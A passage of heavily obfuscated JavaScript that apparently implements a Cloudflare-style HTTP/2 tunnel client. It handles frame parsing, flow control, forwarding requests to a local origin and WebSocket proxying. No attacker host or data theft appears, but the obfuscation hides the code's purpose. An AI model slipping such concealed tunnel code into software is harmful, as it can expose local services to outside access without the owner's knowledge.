                'JiXcj': d9(0x60d),
                'IPBwj': function (h, i) {
                    return h & i;
                }
            };
        if (f['tkFQy'](d[d9(0x261)], 0xffffff))
            throw new Error(f['JiXcj']);
        const g = Buffer[d9(0x53d)](0x9);
        g[d9(0x5a0)](d['length'], 0x0, 0x3), g[0x3] = a, g[0x4] = b, g['writeUInt32BE'](f[d9(0x202)](c, 0x7fffffff), 0x5), this[d9(0x7a6)][d9(0x34b)](Buffer['concat']([
            g,
            d
        ]));
    }
    [a0aO(0x777)](a, b, c = ![]) {
        const da = a0aO, d = {
                'yEHJe': function (h, i) {
                    return h(i);
                },
                'QMZxs': function (h, i) {
                    return h | i;
                }
            }, f = d[da(0x5c7)](a0ae, b), g = d['QMZxs'](0x4, c ? 0x1 : 0x0);
        this[da(0x421)](0x1, g, a, f);
    }
    [a0aO(0x741)](a) {
        const db = a0aO, b = {
                'JeqMw': function (c, d) {
                    return c > d;
                },
                'MECBF': function (c, d) {
                    return c > d;
                }
            };
        if (b[db(0x6b6)](this[db(0x788)], 0x0) && b[db(0x6a4)](this[db(0x371)]['get'](a) ?? 0xffff, 0x0))
            return Promise[db(0x3be)]();
        return new Promise(c => {
            const dc = db;
            this['windowWaiters'][dc(0x51c)]({
                'streamId': a,
                'resolve': c
            });
        });
    }
    [a0aO(0x6e7)]() {
        const dd = a0aO, a = {
                'aNFtI': function (c, d) {
                    return c > d;
                },
                'yoEJL': function (c, d) {
                    return c > d;
                }
            }, b = [];
        for (const c of this[dd(0x207)]) {
            const d = this['streamWindows'][dd(0x6f7)](c['streamId']) ?? 0xffff;
            a['aNFtI'](this[dd(0x788)], 0x0) && a[dd(0x3a9)](d, 0x0) ? c[dd(0x3be)]() : b[dd(0x51c)](c);
        }
        this[dd(0x207)] = b;
    }
    [a0aO(0x402)]() {
        const de = a0aO;
        for (const a of this[de(0x207)]) {
            a[de(0x3be)]();
        }
        this[de(0x207)] = [];
    }
    async [a0aO(0x30c)](a, b, c = ![]) {
        const df = a0aO, d = {
                'obHyB': function (h, i) {
                    return h >= i;
                },
                'ZntVO': function (h, i) {
                    return h - i;
                }
            }, f = b['length'];
        let g = 0x0;
        do {
            await this[df(0x741)](a);
            if (this[df(0x729)])
                return;
            const h = this[df(0x371)][df(0x6f7)](a) ?? 0xffff, i = Math[df(0x53c)](f - g, this[df(0x788)], h, this[df(0x6c9)]), j = c && d[df(0x528)](g + i, f) ? 0x1 : 0x0, k = b[df(0x2a7)](g, g + i);
            this[df(0x788)] -= i, this[df(0x371)]['set'](a, d[df(0x64e)](h, i)), this[df(0x421)](0x0, j, a, k), g += i;
        } while (g < f);
    }
    [a0aO(0x256)](a, b) {
        const dg = a0aO;
        if (b > 0x0) {
            const c = Buffer[dg(0x53d)](0x4);
            c[dg(0x744)](b & 0x7fffffff, 0x0), this['sendFrame'](0x8, 0x0, a, c);
        }
    }
    async ['readFrame']() {
        const dh = a0aO, a = {
                'UUEpG': function (i, j) {
                    return i & j;
                }
            }, b = await this[dh(0x1ab)][dh(0x5fc)](0x9), c = b['readUIntBE'](0x0, 0x3), d = b[0x3], f = b[0x4], g = a[dh(0x52f)](b['readUInt32BE'](0x5), 0x7fffffff), h = await this[dh(0x1ab)][dh(0x5fc)](c);
        return [
            d,
            f,
            g,
            h
        ];
    }
    async [a0aO(0x211)](a, b, c) {
        const di = a0aO, d = {
                'AFfse': function (g, h) {
                    return g & h;
                },
                'BmDCQ': di(0x562),
                'ofZum': function (g, h) {
                    return g - h;
                },
                'xvsOz': function (g, h) {
                    return g !== h;
                },
                'YUtpN': di(0x3fe)
            };
        if (d[di(0x686)](a, 0x8)) {
            const g = c[0x0];
            c = c['subarray'](0x1);
            if (g > c[di(0x261)])
                throw new Error(d['BmDCQ']);
            c = g ? c[di(0x2a7)](0x0, d[di(0x1bb)](c[di(0x261)], g)) : c;
        }
        d[di(0x686)](a, 0x20) && (c = c['subarray'](0x5));
        const f = [c];
        while (!d[di(0x686)](a, 0x4)) {
            const h = await this[di(0x38d)]();
            if (d['xvsOz'](h[0x0], 0x9) || d[di(0x6c0)](h[0x2], b))
                throw new Error(d[di(0x34c)]);
            f[di(0x51c)](h[0x3]), a = h[0x1];
        }
        return this['decoder'][di(0x3ac)](Buffer[di(0x697)](f));
    }
    [a0aO(0x3d3)](a) {
        const dj = a0aO, b = {
                'yZHIp': function (c, d) {
                    return c !== d;
                },
                'LJhIK': dj(0x181),
                'GnNiX': dj(0x30d)
            };
        if (b['yZHIp'](this[dj(0x285)], null))
            return;
        this[dj(0x285)] = new a0av(this, a, this[dj(0x6b8)]), this['sendHeaders'](a, [[
                b[dj(0x18e)],
                b['GnNiX']
            ]]), this[dj(0x285)][dj(0x553)](this[dj(0x17d)], this[dj(0x17c)], this[dj(0x1a1)], this[dj(0x7bc)]);
    }
    ['updateConfig'](a, b) {
        const dk = a0aO, c = {
                'jTKIr': dk(0x58c),
                'dkFMj': function (g, h, i) {
                    return g(h, i);
                },
                'lnstE': dk(0x181),
                'IgHRP': dk(0x30d),
                'bRVEg': dk(0x415),
                'eEOFR': dk(0x590),
                'idjDb': dk(0x7a1)
            };
        let d = 0x0;
        try {
            const g = JSON[dk(0x439)](b[dk(0x261)] ? b[dk(0x3e1)](c[dk(0x3bd)]) : '{}'), h = c[dk(0x6c3)](parseInt, g[dk(0x55c)], 0xa);
            !Number[dk(0x53b)](h) && (d = h);
        } catch (i) {
        }
        const f = Buffer[dk(0x426)](JSON[dk(0x698)]({ 'latestAppliedVersion': d }));
        this['sendHeaders'](a, [
            [
                c[dk(0x501)],
                c['IgHRP']
            ],
            [
                c[dk(0x716)],
                c[dk(0x332)]
            ],
            [
                c[dk(0x485)],
                String(f[dk(0x261)])
            ]
        ]), this[dk(0x30c)](a, f, !![]);
    }
    [a0aO(0x252)](a, b) {
        const dl = a0aO, c = {
                'SMLkH': function (g, h) {
                    return g === h;
                },
                'dCKkC': dl(0x705)
            }, d = '0|3|2|4|1'[dl(0x2c2)]('|');
        let f = 0x0;
        while (!![]) {
            switch (d[f++]) {
            case '0':
                if (c[dl(0x79a)](b[dl(0x34d)], c[dl(0x1ef)])) {
                    this[dl(0x67a)](a, Buffer[dl(0x697)](b[dl(0x19b)]));
                    return;
                }
                continue;
            case '1':
                this[dl(0x2fb)](a, b)[dl(0x648)](() => {
                });
                continue;
            case '2':
                if (b[dl(0x164)])
                    return;
                continue;
            case '3':
                if (b[dl(0x18b)])
                    return;
                continue;
            case '4':
                b[dl(0x164)] = !![];
                continue;
            }
            break;
        }
    }
    async [a0aO(0x2fb)](a, b) {
        const dm = a0aO, c = {
                'obGDW': function (d, f, g, h, i, j) {
                    return d(f, g, h, i, j);
                },
                'DUcBa': function (d, f) {
                    return d === f;
                },
                'MspdZ': dm(0x7a1),
                'xKotW': dm(0x6d4),
                'DmNtG': dm(0x75d),
                'DmYbz': dm(0x2a5),
                'cwnaY': dm(0x4a4),
                'ZogsT': dm(0x68f),
                'KHRAx': function (d, f) {
                    return d(f);
                },
                'gZwRt': 'content-type',
                'vCauL': function (d, f) {
                    return d === f;
                },
                'sJEJL': dm(0x181),
                'mtyHa': 'cf-cloudflared-response-headers',
                'gkcwB': dm(0x5cb),
                'LSYrK': dm(0x6a0),
                'XrYYV': function (d, f) {
                    return d + f;
                },
                'CFBzp': dm(0x723),
                'rHyuM': dm(0x592)
            };
        try {
            const d = await c[dm(0x4fe)](a0ay, this[dm(0x353)], b[dm(0x647)], b[dm(0x738)], b[dm(0x71c)], Buffer[dm(0x697)](b[dm(0x19b)])), f = [], g = [];
            for (const [k, l] of d['headers']) {
                const m = k[dm(0x441)]();
                c[dm(0x318)](m, c['MspdZ']) && g[dm(0x51c)]([
                    m,
                    l
                ]);
                const n = m[dm(0x2c3)](c[dm(0x203)]) || m['startsWith'](c[dm(0x5e0)]) || m[dm(0x2c3)](c['DmYbz']) || m['startsWith'](':');
                (!n || m === c[dm(0x791)] || m === dm(0x34d) || c[dm(0x318)](m, c[dm(0x5b8)])) && f[dm(0x51c)]([
                    m,
                    l
                ]);
            }
            if (!f[dm(0x4ad)](([o]) => o === dm(0x415))) {
                const o = c[dm(0x774)](a0an, b['path']);
                o && f[dm(0x51c)]([
                    c[dm(0x196)],
                    o
                ]);
            }
            const h = a0ar(f), i = c[dm(0x474)](d[dm(0x7ac)], 0x65) ? 0xc8 : d['status'], j = [
                    [
                        c[dm(0x48e)],
                        String(i)
                    ],
                    ...g,
                    [
                        c['mtyHa'],
                        h
                    ],
                    [
                        c[dm(0x1bc)],
                        c[dm(0x71e)]
                    ]
                ];
            this[dm(0x777)](a, j);
            for await (const p of d['body']) {
                await this[dm(0x30c)](a, p, ![]);
            }
            await this[dm(0x30c)](a, Buffer['alloc'](0x0), !![]);
        } catch (q) {
            this[dm(0x6b8)][dm(0x6d8)](c[dm(0x558)]('stream\x20' + a, c['CFBzp']) + q);
            try {
                this['sendHeaders'](a, [[
                        c[dm(0x48e)],
                        c['rHyuM']
                    ]], !![]);
            } catch (r) {
            }
        }
    }
    async [a0aO(0x4d8)]() {
        const dn = a0aO, a = {
                'rCtuO': 'PRI\x20*\x20HTTP/2.0\x0d\x0a\x0d\x0aSM\x0d\x0a\x0d\x0a',
                'gMKBy': function (d, f) {
                    return d + f;
                },
                'klOzf': function (d, f) {
                    return d === f;
                },
                'NKTMy': function (d, f) {
                    return d & f;
                },
                'BuYFv': function (d, f) {
                    return d < f;
                },
                'jKjkz': function (d, f) {
                    return d === f;
                },
                'QZHwn': function (d, f) {
                    return d - f;
                },
                'ziemj': function (d, f) {
                    return d + f;
                },
                'igtdu': function (d, f) {
                    return d <= f;
                },
                'qfjLS': function (d, f) {
                    return d !== f;
                },
                'YoiZH': function (d, f) {
                    return d + f;
                }
            }, b = await this[dn(0x1ab)][dn(0x5fc)](0x18);
        if (!b['equals'](Buffer['from'](a[dn(0x3fa)])))
            throw new Error(dn(0x3c1));
        const c = Buffer[dn(0x53d)](0x6);
        c[dn(0x2bb)](0x3, 0x0), c[dn(0x744)](0x64, 0x2), this[dn(0x421)](0x4, 0x0, 0x0, c);
        this['showTunnel'] && !this[dn(0x445)][dn(0x1c6)] && (process['stdout'][dn(0x34b)](a[dn(0x781)](this[dn(0x36d)], '\x0a')), this[dn(0x445)]['printed'] = !![]);
        try {
            while (!this[dn(0x729)]) {
                const [d, f, g, h] = await this[dn(0x38d)]();
                if (a[dn(0x62d)](d, 0x4)) {
                    if (!a[dn(0x3db)](f, 0x1)) {
                        if (h[dn(0x261)] % 0x6)
                            throw new Error(dn(0x272));
                        for (let i = 0x0; a[dn(0x263)](i, h[dn(0x261)]); i += 0x6) {
                            const j = h[dn(0x56b)](i), k = h['readUInt32BE'](a[dn(0x781)](i, 0x2));
                            if (a[dn(0x2c0)](j, 0x4)) {
                                const l = a[dn(0x38a)](k, 0xffff);
                                for (const m of this[dn(0x371)]['keys']()) {
                                    this[dn(0x371)][dn(0x3bc)](m, Math['max'](0x0, a[dn(0x3f2)](this[dn(0x371)][dn(0x6f7)](m), l)));
                                }
                            } else
                                a[dn(0x62d)](j, 0x5) && k >= 0x4000 && a['igtdu'](k, 0xffffff) && (this[dn(0x6c9)] = k);
                        }
                        this[dn(0x421)](0x4, 0x1, 0x0);
                    }
                    continue;
                }
                if (d === 0x6) {
                    !a[dn(0x3db)](f, 0x1) && this[dn(0x421)](0x6, 0x1, 0x0, h);
                    continue;
                }
                if (a[dn(0x62d)](d, 0x8)) {
                    if (a[dn(0x61b)](h['length'], 0x4))
                        continue;
                    const n = h[dn(0x45b)](0x0) & 0x7fffffff;
                    a[dn(0x2c0)](g, 0x0) ? this[dn(0x788)] += n : this[dn(0x371)][dn(0x3bc)](g, a[dn(0x518)](this['streamWindows'][dn(0x6f7)](g) ?? 0xffff, n));
                    this['_notifyWindows']();
                    continue;
                }
                if (d === 0x3) {
                    this[dn(0x532)][dn(0x5f4)](g);
                    continue;
                }
                if (a[dn(0x2c0)](d, 0x7))
                    break;
                if (a[dn(0x62d)](d, 0x1)) {
                    const o = await this['readHeaders'](f, g, h);
                    !this['streamWindows']['has'](g) && this[dn(0x371)][dn(0x3bc)](g, 0xffff);
                    this[dn(0x24c)](g, f, o);
                    continue;
                }
                if (a[dn(0x62d)](d, 0x0)) {
                    this[dn(0x4ac)](g, f, h);
                    continue;
                }
            }
        } finally {
            this['stopped'] = !![], this['_releaseWaiters']();
            for (const p of this[dn(0x532)][dn(0x5ca)]()) {
                p[dn(0x4ae)] && p['websocketProxy']['stop']();
            }
            try {
                this[dn(0x7a6)][dn(0x482)]();
            } catch (q) {
            }
        }
    }
    [a0aO(0x24c)](a, b, c) {
        const dp = a0aO, d = {
                'JdgtN': function (i, j) {
                    return i === j;
                },
                'cVACA': function (i, j) {
                    return i & j;
                },
                'uRJUl': dp(0x6d3),
                'GmJer': dp(0x157),
                'XxYet': dp(0x18b),
                'dUVOX': ':protocol'
            }, f = {};
        for (const [i, j] of c) {
            i[dp(0x2c3)](':') ? f[i] = j : f[i[dp(0x441)]()] = j;
        }
        const g = (f[a0a0] || '')[dp(0x61c)]()[dp(0x441)]();
        if (d[dp(0x696)](g, a0a1)) {
            this[dp(0x3d3)](a);
            d[dp(0x2c9)](b, 0x1) && (this[dp(0x285)][dp(0x164)] = !![]);
            return;
        }
        const h = {
            'method': f[dp(0x221)] || d[dp(0x301)],
            'path': f[dp(0x46a)] || '/',
            'authority': f[d[dp(0x470)]] || '',
            'headers': c[dp(0x653)](([k]) => !k['startsWith'](':')),
            'body': [],
            'upgrade': g,
            'websocket': d[dp(0x696)](g, d['XxYet']) || d[dp(0x696)]((f[d[dp(0x766)]] || '')[dp(0x441)](), d[dp(0x35e)]),
            'ended': Boolean(b & 0x1),
            'finished': ![]
        };
        this['streams'][dp(0x3bc)](a, h);
        if (h[dp(0x18b)])
            h['websocketProxy'] = new a0au(this, a, h, this['origin'], this[dp(0x6b8)]), h[dp(0x4ae)]['start']();
        else
            h[dp(0x159)] && this[dp(0x252)](a, h);
    }
    [a0aO(0x4ac)](a, b, c) {
        const dq = a0aO, d = {
                'KdSrj': function (g, h) {
                    return g !== h;
                },
                'JUWLK': function (g, h) {
                    return g === h;
                },
                'tkjoD': function (g, h) {
                    return g & h;
                },
                'hsKOA': function (g, h) {
                    return g === h;
                },
                'nRVQB': function (g, h) {
                    return g & h;
                }
            };
        this[dq(0x256)](0x0, c[dq(0x261)]), this['sendWindowUpdate'](a, c[dq(0x261)]);
        if (d[dq(0x550)](this[dq(0x285)], null) && d[dq(0x74f)](this[dq(0x285)][dq(0x78f)], a)) {
            this['control'][dq(0x432)](c);
            d[dq(0x22b)](b, 0x1) && (this[dq(0x285)][dq(0x164)] = !![]);
            return;
        }
        const f = this['streams']['get'](a);
        if (d[dq(0x758)](f, undefined))
            return;
        if (d[dq(0x550)](f[dq(0x4ae)], undefined)) {
            f[dq(0x4ae)][dq(0x432)](c, Boolean(d['nRVQB'](b, 0x1)));
            return;
        }
        c['length'] && f[dq(0x19b)][dq(0x51c)](c), b & 0x1 && (f[dq(0x159)] = !![], this[dq(0x252)](a, f));
    }
}
class a0au {
    constructor(a, b, c, d, f) {
        const dr = a0aO;
        this[dr(0x4a4)] = a, this['streamId'] = b, this['request'] = c, this[dr(0x353)] = d, this[dr(0x6b8)] = f, this[dr(0x6d0)] = [], this[dr(0x775)] = [], this[dr(0x729)] = ![], this[dr(0x7a6)] = null;
    }
    ['start']() {
        this['run']()['catch'](() => {
        });
    }
    ['feed'](a, b = ![]) {
        const ds = a0aO;
        a[ds(0x261)] && this['queue'][ds(0x51c)](a), b && this[ds(0x6d0)][ds(0x51c)](null), this[ds(0x3b6)]();
    }
    ['stop']() {
        const dt = a0aO;
        if (this[dt(0x729)])
            return;
        this['stopped'] = !![], this[dt(0x3b6)]();
        if (this['sock'] !== null)
            try {
                this[dt(0x7a6)][dt(0x482)]();
            } catch (a) {
            }
    }
    ['_wake']() {
        const du = a0aO, a = {
                'zdLRV': function (b) {
                    return b();
                }
            };
        for (const b of this['waiters']) {
            a['zdLRV'](b);
        }
        this[du(0x775)] = [];
    }
    async [a0aO(0x191)]() {
        const dv = a0aO;
        while (!this[dv(0x729)]) {
            if (this[dv(0x6d0)]['length'])
                return this['queue'][dv(0x54b)]();
            await new Promise(a => this[dv(0x775)][dv(0x51c)](a));
        }
        return null;
    }
    async ['run']() {
        const dw = a0aO, a = {
                'mpQzq': function (b, c) {
                    return b(c);
                },
                'zKZUC': function (b, c) {
                    return b(c);
                },
                'EAEIy': dw(0x7a1),
                'mEFsX': dw(0x2a5),
                'laguW': function (b, c) {
                    return b === c;
                },
                'tHesK': dw(0x34d),
                'RTAxo': function (b, c) {
                    return b === c;
                },
                'hhTkw': dw(0x68f),
                'HZwyg': function (b, c) {
                    return b(c);
                },
                'CLQTk': ':status',
                'JqyBy': dw(0x5a3),
                'LQFvO': dw(0x5cb),
                'LdRTW': dw(0x6a0),
                'CBFfQ': function (b, c) {
                    return b + c;
                },
                'BBIpg': dw(0x228),
                'NCESK': dw(0x4ab),
                'xHXgx': dw(0x592)
            };
        try {
            this[dw(0x7a6)] = await a[dw(0x768)](a0aw, this[dw(0x353)]), this[dw(0x3f1)]();
            const b = await a[dw(0x665)](a0az, this[dw(0x7a6)]), c = [], d = [];
            for (const [i, j] of b[dw(0x71c)]) {
                const k = i[dw(0x441)]();
                k === a['EAEIy'] && d[dw(0x51c)]([
                    k,
                    j
                ]);
                const l = k[dw(0x2c3)]('cf-int-') || k['startsWith']('cf-cloudflared-') || k[dw(0x2c3)](a[dw(0x63a)]) || k[dw(0x2c3)](':');
                (!l || k === dw(0x4a4) || a[dw(0x4fb)](k, a[dw(0x568)]) || a['RTAxo'](k, a[dw(0x60b)])) && c[dw(0x51c)]([
                    k,
                    j
                ]);
            }
            const f = a[dw(0x1f9)](a0ar, c), g = b[dw(0x7ac)] === 0x65 ? 0xc8 : b[dw(0x7ac)], h = [
                    [
                        a[dw(0x462)],
                        String(g)
                    ],
                    ...d,
                    [
                        a[dw(0x769)],
                        f
                    ],
                    [
                        a['LQFvO'],
                        a[dw(0x3ca)]
                    ]
                ];
            this[dw(0x4a4)]['sendHeaders'](this[dw(0x78f)], h), this['writeToOrigin']()['catch'](() => {
            }), await this[dw(0x3d9)](b[dw(0x16e)]);
        } catch (m) {
            this[dw(0x6b8)][dw(0x6d8)](a[dw(0x493)](a[dw(0x493)](a[dw(0x493)](a['BBIpg'], this['streamId']), a[dw(0x6bc)]), m));
            try {
                this[dw(0x4a4)]['sendHeaders'](this[dw(0x78f)], [[
                        a['CLQTk'],
                        a[dw(0x3b4)]
                    ]], !![]);
            } catch (n) {
            }
        } finally {
            this['stop']();
        }
    }
    async [a0aO(0x3d9)](a) {
        const dx = a0aO;
        a[dx(0x261)] && await this[dx(0x4a4)]['sendData'](this['streamId'], a, ![]);
        for await (const b of this[dx(0x7a6)]) {
            if (this[dx(0x729)])
                break;
            await this[dx(0x4a4)][dx(0x30c)](this['streamId'], b, ![]);
        }
        !this[dx(0x729)] && await this[dx(0x4a4)][dx(0x30c)](this[dx(0x78f)], Buffer[dx(0x53d)](0x0), !![]);
    }
    async ['writeToOrigin']() {
        const dy = a0aO, a = {
                'IMXkk': function (b, c) {
                    return b === c;
                }
            };
        while (!this['stopped']) {
            const b = await this[dy(0x191)]();
            if (a[dy(0x1f7)](b, null))
                return;
            try {
                this[dy(0x7a6)]['write'](b);
            } catch (c) {
                this[dy(0x729)] = !![];
                return;
            }
        }
    }
    [a0aO(0x3f1)]() {
        const dz = a0aO, a = {
                'yLHtq': function (i, j) {
                    return i + j;
                },
                'bGtXR': dz(0x38b),
                'vSUVK': function (i, j) {
                    return i === j;
                },
                'YLSvR': dz(0x5e9),
                'WqzTJ': function (i, j) {
                    return i === j;
                },
                'GnXqB': 'upgrade',
                'usdAL': dz(0x7a1),
                'Spomt': function (i, j) {
                    return i === j;
                },
                'hnMTO': dz(0x37e),
                'GWQUb': function (i, j) {
                    return i === j;
                },
                'KiVEn': dz(0x2ad),
                'DdruX': function (i, j) {
                    return i === j;
                },
                'YxxRt': function (i, j) {
                    return i + j;
                },
                'lcZVn': 'Host:\x20',
                'QSgLL': dz(0x688),
                'kQpUP': 'Sec-WebSocket-Key:\x20',
                'xJbpr': dz(0x3a2),
                'ERkHe': dz(0x447),
                'NUQKn': dz(0x23f),
                'ouHQB': function (i, j) {
                    return i + j;
                },
                'BpoLN': '\x0d\x0a\x0d\x0a',
                'fhzQB': dz(0x679)
            }, b = new URL(this[dz(0x353)]), c = this[dz(0x544)]['path'][dz(0x2c3)]('/') ? this[dz(0x544)][dz(0x738)] : a[dz(0x2d7)]('/', this[dz(0x544)][dz(0x738)]), d = [a[dz(0x2d7)](a[dz(0x712)] + c, dz(0x605))];
        let f = ![], g = ![], h = ![];
        for (const [i, j] of this[dz(0x544)]['headers']) {
            const k = i[dz(0x441)]();
            if (a[dz(0x304)](k, a[dz(0x55f)]) || a[dz(0x6f1)](k, 'connection') || a[dz(0x304)](k, a[dz(0x337)]) || a['vSUVK'](k, a[dz(0x610)]) || a[dz(0x304)](k, dz(0x2ff)))
                continue;
            if (a[dz(0x68b)](k, a['hnMTO']))
                f = !![];
            else {
                if (a[dz(0x325)](k, a['KiVEn']))
                    g = !![];
                else
                    a['DdruX'](k, dz(0x353)) && (h = !![]);
            }
            d[dz(0x51c)](a[dz(0x2d7)](a[dz(0x246)](i, ':\x20'), j));
        }
        d[dz(0x51c)](a[dz(0x495)] + b[dz(0x5e9)]), !h && this[dz(0x544)][dz(0x2d5)] && d[dz(0x51c)](a[dz(0x527)] + this[dz(0x544)][dz(0x2d5)]), !f && d['push'](a[dz(0x2d7)](a[dz(0x405)], a0k[dz(0x391)](0x10)[dz(0x3e1)](a[dz(0x7b1)]))), !g && d['push'](a['ERkHe']), d[dz(0x51c)](dz(0x2b1)), d[dz(0x51c)](a[dz(0x436)]), this[dz(0x7a6)][dz(0x34b)](Buffer[dz(0x426)](a[dz(0x288)](d[dz(0x4d0)]('\x0d\x0a'), a[dz(0x423)]), a[dz(0x317)]));
    }
}
class a0av {
    constructor(a, b, c) {
        const dA = a0aO, d = { 'UsmeQ': '3|1|0|2|4' }, f = d[dA(0x331)]['split']('|');
        let g = 0x0;
        while (!![]) {
            switch (f[g++]) {
            case '0':
                this['log'] = c;
                continue;
            case '1':
                this[dA(0x78f)] = b;
                continue;
            case '2':
                this[dA(0x7aa)] = Buffer[dA(0x53d)](0x0);
                continue;
            case '3':
                this[dA(0x4a4)] = a;
                continue;
            case '4':
                this[dA(0x164)] = ![];
                continue;
            }
            break;
        }
    }
    [a0aO(0x553)](a, b, c, d) {
        const dB = a0aO, f = {
                'LAWHX': function (g, h) {
                    return g(h);
                },
                'jRKxj': function (g, h, i, j, k, l, m) {
                    return g(h, i, j, k, l, m);
                }
            };
        this[dB(0x4a4)][dB(0x30c)](this[dB(0x78f)], f[dB(0x79f)](a0ag, 0x0), ![]), this[dB(0x4a4)][dB(0x30c)](this[dB(0x78f)], f[dB(0x7a4)](a0ah, 0x1, 0x0, a, b, c, d), ![]);
    }
    [a0aO(0x432)](a) {
        const dC = a0aO, b = {
                'dLhjt': function (f, g) {
                    return f(g);
                },
                'XpCQV': function (f, g) {
                    return f + g;
                },
                'ziajA': 'tunnel\x20connection\x20registered\x20at\x20',
                'cEPSJ': dC(0x711),
                'StnJc': dC(0x23d),
                'WTWos': dC(0x27c)
            };
        this['buffer'] = this[dC(0x7aa)]['length'] ? Buffer[dC(0x697)]([
            this['buffer'],
            a
        ]) : a;
        let c, d;
        [c, d] = a0ai(this[dC(0x7aa)]), this[dC(0x7aa)] = d;
        for (const f of c) {
            try {
                const g = b[dC(0x4d7)](a0al, f);
                g['ok'] ? (this[dC(0x6b8)][dC(0x793)](b[dC(0x189)](b['ziajA'], g[dC(0x1eb)] || dC(0x44b))), this[dC(0x4a4)][dC(0x591)] = !![]) : this[dC(0x6b8)][dC(0x6d8)](b[dC(0x189)](b['cEPSJ'], g[dC(0x49c)] || b[dC(0x4b4)]));
            } catch (h) {
                this['log']['debug'](b[dC(0x189)](b[dC(0x1aa)], h));
            }
        }
    }
}
function a0aw(a) {
    const dD = a0aO, b = {
            'Yueck': dD(0x49c),
            'emMvA': function (c, d) {
                return c(d);
            },
            'nCMne': function (c, d, f) {
                return c(d, f);
            },
            'oVyPm': function (c, d, f) {
                return c(d, f);
            },
            'XcTiW': function (c, d) {
                return c(d);
            },
            'QMqjw': dD(0x6d6),
            'Vgbpe': dD(0x365),
            'WGBZN': dD(0x570),
            'NQhij': function (c, d) {
                return c === d;
            },
            'JhjGu': dD(0x51b)
        };
    return new Promise((c, d) => {
        const dE = dD, f = {
                'hSJBq': b[dE(0x7a8)],
                'Xvauy': function (n, o) {
                    const dF = dE;
                    return b[dF(0x77c)](n, o);
                },
                'aCvHZ': function (n, o, p) {
                    const dG = dE;
                    return b[dG(0x504)](n, o, p);
                },
                'pJFwd': function (n, o, p) {
                    const dH = dE;
                    return b[dH(0x54e)](n, o, p);
                }
            };
        let g;
        try {
            g = new URL(a);
        } catch (n) {
            b['XcTiW'](d, new Error(b[dE(0x338)]));
            return;
        }
        if (![
                b[dE(0x63e)],
                b[dE(0x26e)]
            ][dE(0x47a)](g['protocol']) || !g[dE(0x5ec)]) {
            b[dE(0x77c)](d, new Error(b['QMqjw']));
            return;
        }
        const h = b[dE(0x6f6)](g['protocol'], b[dE(0x26e)]), i = g['port'] || (h ? 0x1bb : 0x50), j = a0i[dE(0x51b)]({
                'host': g[dE(0x5ec)],
                'port': i
            });
        let k = ![];
        const l = (o, p) => {
                const dI = dE;
                if (k)
                    return;
                k = !![], j['removeListener'](f['hSJBq'], m), j[dI(0x179)](0x0), f[dI(0x319)](o, p);
            }, m = o => {
                !k && l(d, o);
            };
        j['on'](b[dE(0x7a8)], m), j[dE(0x179)](0x7530, () => j[dE(0x482)](new Error(dE(0x6a1)))), j['on'](b[dE(0x290)], () => {
            const dK = dE, o = {
                    'IECuG': function (q, r, s) {
                        const dJ = a0b;
                        return f[dJ(0x2f7)](q, r, s);
                    }
                };
            if (!h) {
                f[dK(0x2f7)](l, c, j);
                return;
            }
            const p = a0j[dK(0x51b)]({
                'socket': j,
                'servername': g[dK(0x5ec)]
            });
            p['on'](dK(0x49c), q => {
                const dL = dK;
                !k && o[dL(0x40a)](l, d, q);
            }), p['on'](dK(0x6af), () => {
                const dM = dK;
                f[dM(0x17f)](l, c, p);
            });
        });
    });
}
function a0ax(a) {
    const dN = a0aO, b = [];
    for (let c = 0x0; c < a[dN(0x519)][dN(0x261)]; c += 0x2) {
        b[dN(0x51c)]([
            a['rawHeaders'][c],
            a[dN(0x519)][c + 0x1]
        ]);
    }
    return b;
}
function a0b(a, b) {
    a = a - 0x13f;
    const c = a0a();
    let d = c[a];
    if (a0b['qXEXDQ'] === undefined) {
        var e = function (h) {
            const i = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
            let j = '', l = '';
            for (let m = 0x0, n, o, p = 0x0; o = h['charAt'](p++); ~o && (n = m % 0x4 ? n * 0x40 + o : o, m++ % 0x4) ? j += String['fromCharCode'](0xff & n >> (-0x2 * m & 0x6)) : 0x0) {
                o = i['indexOf'](o);
            }
            for (let q = 0x0, r = j['length']; q < r; q++) {
                l += '%' + ('00' + j['charCodeAt'](q)['toString'](0x10))['slice'](-0x2);
            }
            return decodeURIComponent(l);
        };
        a0b['vWCkEQ'] = e, a0b['jiAezm'] = {}, a0b['qXEXDQ'] = !![];
    }
    const f = c[0x0];
    a0b['RfeEmh'] !== f && (a0b['jiAezm'] = {}, a0b['RfeEmh'] = f);
    const g = a0b['jiAezm'][a];
    return g === undefined ? (d = a0b['vWCkEQ'](d), a0b['jiAezm'][a] = d) : d = g, d;
}
function a0ay(a, b, c, d, f) {
    const dO = a0aO, g = {
            'EMIfh': function (h, i) {
                return h(i);
            },
            'vMAkR': dO(0x6d6),
            'GsdWv': dO(0x570),
            'rpxbN': function (h, i) {
                return h === i;
            },
            'ITNDK': function (h, i) {
                return h === i;
            },
            'VkmJu': 'host',
            'VGVfV': 'connection',
            'eeDiZ': function (h, i) {
                return h === i;
            },
            'kKCwV': 'Host',
            'UnMkH': dO(0x5d2),
            'wcSDM': function (h, i) {
                return h(i);
            },
            'PHExz': function (h, i) {
                return h + i;
            },
            'niqOV': dO(0x49c)
        };
    return new Promise((h, i) => {
        const dQ = dO, j = {
                'QlNxd': function (r, s) {
                    const dP = a0b;
                    return g[dP(0x213)](r, s);
                }
            };
        let k;
        try {
            k = new URL(a);
        } catch (r) {
            i(new Error(g[dQ(0x551)]));
            return;
        }
        if (![
                dQ(0x365),
                g['GsdWv']
            ][dQ(0x47a)](k[dQ(0x21b)]) || !k['hostname']) {
            i(new Error(g[dQ(0x551)]));
            return;
        }
        const l = g[dQ(0x6fb)](k[dQ(0x21b)], g[dQ(0x5ab)]), m = k['port'] || (l ? 0x1bb : 0x50), n = {};
        for (const [s, t] of d) {
            const u = s[dQ(0x441)]();
            if (g[dQ(0x787)](u, g[dQ(0x4d3)]) || g[dQ(0x6fb)](u, g[dQ(0x170)]) || g[dQ(0x787)](u, 'transfer-encoding') || g[dQ(0x258)](u, dQ(0x7a1)))
                continue;
            n[s] = t;
        }
        n[g[dQ(0x616)]] = k['host'];
        f[dQ(0x261)] && (n[g[dQ(0x722)]] = g[dQ(0x299)](String, f[dQ(0x261)]));
        const o = c[dQ(0x2c3)]('/') ? c : g[dQ(0x227)]('/', c), p = l ? a0h : a0g, q = p[dQ(0x544)]({
                'hostname': k['hostname'],
                'port': m,
                'path': o,
                'method': b,
                'headers': n,
                'timeout': 0x7530
